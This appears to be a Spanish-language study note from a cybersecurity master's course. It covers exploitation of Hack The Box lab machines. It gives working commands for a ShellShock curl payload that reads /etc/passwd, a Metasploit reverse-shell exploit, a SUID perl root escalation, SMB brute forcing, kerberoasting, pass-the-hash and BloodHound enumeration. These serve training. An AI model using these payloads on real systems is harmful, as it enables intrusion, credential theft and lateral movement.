> [!info] Ficha técnica
> **Programa:** Máster en Ciberseguridad — Evolve Academy
> **Bloque:** 05 — Explotación de Sistemas Operativos
> **Contenido:** Linux (Shocker, SUID, GTFOBins) y Windows (PowerShell, Active Directory, BloodHound, Kerberoasting, Pass-the-Hash) con máquinas HTB

---

## ① Metodología general de explotación

```
Fase 1 → Escaneo e identificación de vulnerabilidades (nmap)
Fase 2 → Explotación inicial (reverse shell, credentials, servidores)
Fase 3 → Post-explotación (escalar privilegios, moverse lateralmente)
Fase 4 → Persistencia (si fuera necesario)
```

> [!tip] Objetivo del post-explotación
> En HTB necesitamos las **flags** de usuario y root. Para conseguirlas hay que escalar privilegios desde la shell inicial que consigamos.

---

## ② Explotación de Linux — Shocker (10.10.10.76)

Shocker explota **ShellShock** (CVE-2014-6271), una vulnerabilidad en el componente CGI de Apache que permite ejecutar código arbitrario a través de variables de entorno HTTP inyectadas.

### Paso 1: Fingerprinting y reconocimiento

```bash
nikto -h http://10.10.10.76

# Nikto nos revela la existencia de /cgi-bin/status — un endpoint CGI vulnerable
```

El endpoint `/cgi-bin/status` es el vector de ataque. ShellShock se inyecta en cabeceras HTTP (`User-Agent`, `Referer`, etc.) y ejecuta comandos del sistema operativo en el servidor remoto.

### Paso 2: Verificación manual con cURL

```bash
curl -A '() { :;}; /bin/cat /etc/passwd' http://10.10.10.76/cgi-bin/status
```

Si el servidor responde con el contenido de `/etc/passwd`, la vulnerabilidad está confirmada.

### Paso 3: Reverse shell automática con Metasploit

```bash
msfconsole
search shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS 10.10.10.76
set TARGETURI /cgi-bin/status
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST tun0
run
```

Al ejecutar el exploit se obtiene una sesión Meterpreter. Para acceder a una shell interactiva:

```bash
shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### Paso 4: Escalada de privilegios — SUID y GTFOBins

```bash
find / -perm -u=s -type f 2>/dev/null
# Resultado: /usr/bin/perl
```

**GTFOBins** es la referencia estándar para explotar binarios con permisos SUID.

```bash
./perl -e 'exec "/bin/sh";'
whoami # root
cat /root/root.txt
```

> [!important] ShellShock no solo afecta a CGI
> Puede afectar a DHCP clients, OpenSSH, mail servers, y otros servicios que usen Bash para procesar datos externos.

### Paso 5: Obtención de la flag de usuario

El usuario `shelly` tiene el home en `/home/shelly`:

```bash
ls /home/shelly
cat /home/shelly/user.txt
# flag{hash...}
```

---

## ③ Explotación de Windows — Active Directory con PowerShell

### Reconocimiento inicial

```powershell
Get-NetIPConfiguration # configuración de red
whoami /all # usuarios, grupos, privilegios
Get-ADUser -Filter * # enumerar usuarios AD
Get-ADGroup -Filter * # enumerar grupos AD
Get-ADGroupMember -Identity "Domain Admins" # miembros de Domain Admins
```

### Fuerza bruta con Hydra

```bash
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt <IP> smb
```

### Enumeración de carpetas SMB

```powershell
net view \\<IP> /all
dir \\<IP>\<recurso>
```

### Exfiltración con Invoke-SmbExec

```powershell
Invoke-SmbExec -Target <IP> -Username <usuario> -Password <password> -Command "type C:\Users\Administrator\Desktop\proof.txt"
```

---

## ④ Active Directory: Kerberoasting y Pass-the-Hash

### Kerberoasting

Con **Rubeus** se solicitan TGS (Service Ticket) para cuentas de servicio configuradas con SPN, que pueden ser crackeadas offline con Hashcat:

```powershell
.\Rubeus.exe kerberoast /outfile:hashes.txt
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash

Con **PsExec** o **CrackMapExec** se puede autenticar usando directamente el hash NTLM sin necesidad de crackear la contraseña:

```bash
psexec.py <usuario>@<IP> -hashes aad3b435b51404eeaad3b435b51404ee:<hash_lm>:<hash_nt>
crackmapexec smb <IP> -u <usuario> -H <hash_ntlm>
```

---

## ⑤ BloodHound — Visualización de rutas de ataque

BloodHound recopila información de Active Directory (usuarios, grupos, SPNs, contraseñas que nunca cambian, privilegios) y genera grafos que muestran caminos hacia **Domain Admin**.

### Recopilación de datos

```powershell
.\SharpHound.exe -c All
```

### Importación y análisis

```bash
bloodhound-python -u <usuario> -p <password> -d <dominio> -ns <IP_DC> -c All
```

Los grafos resultantes identifican rutas de explotación como: usuario A tiene privilegio X → grupo Y → cuenta de servicio Z → Domain Admin.

---

## ⑥ Escalada de privilegios Windows — Token Impersonation y Potato

### Potatoes (JuicyPotato, HotPotato, etc.)

Explotan la impersonación de tokens NT en servicios configurados incorrectamente (ej: servidores que ejecutan como SYSTEM pero con impersonation habilitado).

### UAC Bypass

Para escalar de usuario administrador a SYSTEM sin que Windows muestre el diálogo UAC.

### WinPEAS

```powershell
.\winpeas.exe
```

WinPEAS escanea el sistema y muestra automáticamente las vulnerabilidades de escalada de privilegios encontradas, como servicios con rutas configuradas incorrectamente, contraseñas en texto plano en registros, o tokens impersonables.

---

## ⑦ Encadenamiento completo: de la shell inicial a Domain Admin

El objetivo es crear una **cadena de ataque** completa:

```
Explotación inicial (servicio vulnerable) → Shell regular → Escalada local (SUID/Potato)
→ Credenciales filtradas → Movimiento lateral → Domain Admin
```

> [!important] Flujo típico en HTB
> En Windows: exploits locales → credenciales → movimientos laterales → persistencia → objetivo.
> En Linux: exploit → escalada (SUID/GTFOBins/cron) → root → flag.

> [!warning] Cada sistema tiene su propio camino
> No hay una sola técnica universal — la clave es entender el sistema y encontrar las debilidades específicas de cada configuración.
